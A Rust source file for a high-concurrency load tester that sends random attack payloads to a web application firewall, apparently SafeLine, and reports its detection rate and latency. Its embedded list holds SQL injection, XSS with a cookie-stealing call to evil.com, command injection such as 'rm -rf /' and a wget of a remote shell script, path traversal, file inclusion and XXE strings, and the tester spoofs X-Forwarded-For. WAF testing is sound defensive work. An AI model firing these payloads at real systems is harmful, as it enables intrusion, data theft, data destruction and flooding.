use clap::Parser;
use reqwest::{Client, StatusCode};
use serde::Serialize;
use std::collections::HashMap;
use std::fs::{self, File};
use std::io::Write;
use std::sync::atomic::{AtomicBool, AtomicU64, Ordering};
use std::sync::Arc;
use std::time::{Duration, Instant};
use tokio::sync::mpsc;
use tokio::time::sleep;

use chrono::Utc;
use hdrhistogram::Histogram;
use rand::seq::SliceRandom;
use rand::{Rng, SeedableRng};

#[derive(Parser, Debug)]
#[clap(author, version, about, long_about = "A high-performance load tester written in Rust, designed to generate instant, high-throughput traffic.")]
struct Args {
    #[clap(short, long, default_value = "http://10.184.0.2")]
    target_url: String,

    #[clap(short, long, default_value_t = 60)]
    duration: u64,

    #[clap(short, long, default_value_t = 1000)]
    concurrency: usize,
}

#[derive(Debug, Serialize)]
struct AttackResult {
    timestamp: i64,
    attack_type: String,
    status_code: u16,
    response_time_ms: u64,
    blocked: bool,
    success: bool,
}

#[derive(Debug)]
struct Stats {
    total_requests: u64,
    successful_requests: u64,
    blocked_requests: u64,
    error_requests: u64,
    total_response_time_ms: u64,
}

fn get_attack_patterns() -> HashMap<String, Vec<String>> {
    serde_json::from_str(
        r#"{
            "sql_injection": [
                "1' OR '1'='1", "1' UNION SELECT null,null,null--", "1'; DROP TABLE users--",
                "1' AND (SELECT SLEEP(5))--", "admin'--", "1' OR 1=1#",
                "'; SELECT * FROM information_schema.tables--", "1' UNION ALL SELECT NULL,NULL,NULL--",
                "admin'; EXEC xp_cmdshell('dir')--", "1' OR 'a'='a"
            ],
            "xss": [
                "<script>alert('XSS')</script>", "<img src=x onerror=alert(1)>", "<svg onload=alert('XSS')>",
                "javascript:alert('XSS')", "<iframe src='javascript:alert(\"XSS\")'></iframe>",
                "<body onload=alert('XSS')>", "<div onclick=alert('XSS')>Click me</div>",
                "<input onfocus=alert('XSS') autofocus>", "'\"><script>alert('XSS')</script>",
                "<script>document.location='http://evil.com?'+document.cookie</script>"
            ],
            "command_injection": [
                "; cat /etc/passwd", "| whoami", "&& id", "|| uname -a", "; rm -rf /", "| ls -la",
                "&& curl http://evil.com", "; ping -c 1 127.0.0.1", "| nc -l 4444",
                "&& wget http://malicious.com/shell.sh"
            ],
            "path_traversal": [
                "../../../../etc/passwd", "..\\..\\..\\windows\\system32\\config\\sam", "/etc/passwd%00",
                "....//....//....//etc/passwd", "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
                "..%252f..%252f..%252fetc%252fpasswd", "../../../root/.bash_history", "..\\..\\..\\boot.ini"
            ],
            "file_inclusion": [
                "file:///etc/passwd", "php://input", "php://filter/convert.base64-encode/resource=index.php",
                "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+", "expect://id"
            ],
            "xxe": [
                "<?xml version='1.0'?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>",
                "<?xml version='1.0'?><!DOCTYPE data [<!ENTITY file SYSTEM 'file:///etc/hosts'>]><data>&file;</data>"
            ]
        }"#,
    )
    .unwrap()
}

fn is_blocked(status_code: StatusCode, content: &str) -> bool {
    if status_code.is_client_error() && status_code != StatusCode::NOT_FOUND {
        return true;
    }
    let block_indicators = [
        "blocked", "denied", "security", "safeline", "waf",
        "forbidden", "unauthorized", "suspicious", "threat",
    ];
    let content_lower = content.to_lowercase();
    block_indicators
        .iter()
        .any(|&indicator| content_lower.contains(indicator))
}

async fn attack_worker(
    client: Client,
    target_url: Arc<String>,
    attack_patterns: Arc<HashMap<String, Vec<String>>>,
    stop_flag: Arc<AtomicBool>,
    tx: mpsc::Sender<AttackResult>,
) {
    let attack_types: Vec<_> = attack_patterns.keys().cloned().collect();
    let mut rng = rand::rngs::StdRng::from_entropy();

    while !stop_flag.load(Ordering::Relaxed) {
        let attack_type = attack_types.choose(&mut rng).unwrap();
        let payload = attack_patterns[attack_type].choose(&mut rng).unwrap();

        let url = format!("{}/?q={}", target_url, urlencoding::encode(payload));
        let forwarded_for = format!("192.168.{}.{}", rng.gen_range(1..255), rng.gen_range(1..255));
        
        let start_time = Instant::now();
        
        let response_result = client
            .get(&url)
            .header("User-Agent", "SafeLine-Rust-LoadTester/1.0")
            .header("X-Forwarded-For", forwarded_for)
            .timeout(Duration::from_secs(10))
            .send()
            .await;

        let response_time_ms = start_time.elapsed().as_millis() as u64;

        let result = match response_result {
            Ok(res) => {
                let status = res.status();
                let content_bytes = res.bytes().await.unwrap_or_default();
                let content = String::from_utf8_lossy(&content_bytes);
                let blocked = is_blocked(status, &content);
                AttackResult {
                    timestamp: Utc::now().timestamp(),
                    attack_type: attack_type.clone(),
                    status_code: status.as_u16(),
                    response_time_ms,
                    blocked,
                    success: true,
                }
            }
            Err(_) => AttackResult {
                timestamp: Utc::now().timestamp(),
                attack_type: attack_type.clone(),
                status_code: 0,
                response_time_ms,
                blocked: false,
                success: false,
            },
        };
        
        if tx.send(result).await.is_err() {
            // Receiver has been dropped, so we should stop.
            break;
        }
    }
}

async fn stats_collector(
    mut rx: mpsc::Receiver<AttackResult>,
    stop_flag: Arc<AtomicBool>,
    duration_secs: u64,
) {
    let mut all_results = Vec::new();
    let mut histogram = Histogram::<u64>::new(3).unwrap();
    let start_time = Instant::now();
    let mut last_report_time = Instant::now();

    let total_requests = Arc::new(AtomicU64::new(0));
    let blocked_requests = Arc::new(AtomicU64::new(0));
    let successful_requests = Arc::new(AtomicU64::new(0));

    let mut ticker = tokio::time::interval(Duration::from_secs(1));

    loop {
        tokio::select! {
            Some(result) = rx.recv() => {
                total_requests.fetch_add(1, Ordering::Relaxed);
                if result.success {
                    successful_requests.fetch_add(1, Ordering::Relaxed);
                    if result.blocked {
                        blocked_requests.fetch_add(1, Ordering::Relaxed);
                    }
                    histogram.record(result.response_time_ms).unwrap();
                }
                all_results.push(result);
            },
            _ = ticker.tick() => {
                let elapsed = last_report_time.elapsed().as_secs_f64();
                if elapsed > 0.0 {
                    let current_total = total_requests.swap(0, Ordering::Relaxed);
                    let tps = current_total as f64 / elapsed;
                    
                    let total_so_far = all_results.len() as u64;
                    let blocked_so_far = all_results.iter().filter(|r| r.blocked).count() as u64;
                    let detection_rate = if total_so_far > 0 { (blocked_so_far * 100) as f64 / total_so_far as f64 } else { 0.0 };

                    println!(
                        "Time: {:>4.0}s | TPS: {:>7.1} | Total Req: {:>8} | Blocked: {:>6} | Detection: {:>5.1}% | P99 Latency: {:>5}ms",
                        start_time.elapsed().as_secs_f32(),
                        tps,
                        total_so_far,
                        blocked_so_far,
                        detection_rate,
                        histogram.value_at_percentile(99.0)
                    );
                    last_report_time = Instant::now();
                    total_requests.store(0, Ordering::Relaxed);
                }
            },
            else => break,
        }

        if start_time.elapsed().as_secs() >= duration_secs {
            stop_flag.store(true, Ordering::Relaxed);
            break;
        }
    }
    
    println!("\n--- Test Finished ---");
    generate_final_report(&all_results, &histogram, start_time.elapsed());
}

fn generate_final_report(results: &[AttackResult], histogram: &Histogram<u64>, duration: Duration) {
    if results.is_empty() {
        println!("No results to generate a report.");
        return;
    }

    let total_requests = results.len();
    let blocked_requests = results.iter().filter(|r| r.blocked).count();
    let successful_requests = results.iter().filter(|r| r.success).count();
    let detection_rate = if total_requests > 0 { (blocked_requests as f64 / total_requests as f64) * 100.0 } else { 0.0 };
    let avg_rps = total_requests as f64 / duration.as_secs_f64();

    println!("\n--- Final Report ---");
    println!("Test Duration: {:.2}s", duration.as_secs_f32());
    println!("Total Requests: {}", total_requests);
    println!("Successful Requests: {}", successful_requests);
    println!("Blocked Requests: {}", blocked_requests);
    println!("Overall Detection Rate: {:.2}%", detection_rate);
    println!("Average RPS: {:.2}", avg_rps);
    
    println!("\nLatency (ms):");
    println!("  Avg: {:.2}", histogram.mean());
    println!("  Min: {}", histogram.min());
    println!("  Max: {}", histogram.max());
    println!("  p50: {}", histogram.value_at_percentile(50.0));
    println!("  p90: {}", histogram.value_at_percentile(90.0));
    println!("  p95: {}", histogram.value_at_percentile(95.0));
    println!("  p99: {}", histogram.value_at_percentile(99.0));

    // Save raw results to a file
    let timestamp = Utc::now().format("%Y%m%d_%H%M%S").to_string();
    let filename = format!("rust_load_test_results_{}.json", timestamp);
    fs::create_dir_all("test_results").expect("Could not create results directory");
    let mut file = File::create(format!("test_results/{}", filename)).expect("Could not create file");
    let json_data = serde_json::to_string_pretty(results).expect("Could not serialize results");
    file.write_all(json_data.as_bytes()).expect("Could not write to file");
    println!("\nFull report saved to test_results/{}", filename);
}

#[tokio::main]
async fn main() {
    let args = Args::parse();

    println!("🔥 Starting High-Throughput Load Test");
    println!("--------------------------------------");
    println!("Target URL: {}", args.target_url);
    println!("Concurrency: {}", args.concurrency);
    println!("Duration: {}s", args.duration);
    println!("--------------------------------------");
    println!("Test starting in 3 seconds...");
    sleep(Duration::from_secs(3)).await;

    let stop_flag = Arc::new(AtomicBool::new(false));
    let target_url = Arc::new(args.target_url);
    let attack_patterns = Arc::new(get_attack_patterns());
    
    let (tx, rx) = mpsc::channel(args.concurrency * 2);

    let stats_task = tokio::spawn(stats_collector(rx, stop_flag.clone(), args.duration));

    let client = Client::builder()
        .pool_max_idle_per_host(args.concurrency)
        .connect_timeout(Duration::from_secs(10))
        .build()
        .unwrap();

    let mut worker_handles = Vec::new();
    for _ in 0..args.concurrency {
        let client = client.clone();
        let target_url = target_url.clone();
        let attack_patterns = attack_patterns.clone();
        let stop_flag = stop_flag.clone();
        let tx = tx.clone();
        worker_handles.push(tokio::spawn(attack_worker(
            client,
            target_url,
            attack_patterns,
            stop_flag,
            tx,
        )));
    }
    
    // Drop the original sender to allow the stats collector to finish when all workers are done
    drop(tx);

    // Wait for Ctrl+C or for the duration to end
    tokio::select! {
        _ = tokio::signal::ctrl_c() => {
            println!("\nCtrl+C received, shutting down gracefully...");
            stop_flag.store(true, Ordering::Relaxed);
        },
        _ = sleep(Duration::from_secs(args.duration + 1)) => {
            // The stats collector will trigger the stop flag
        }
    }

    // Wait for all tasks to complete
    for handle in worker_handles {
        handle.await.unwrap();
    }
    stats_task.await.unwrap();

    println!("\nLoad test finished.");
}
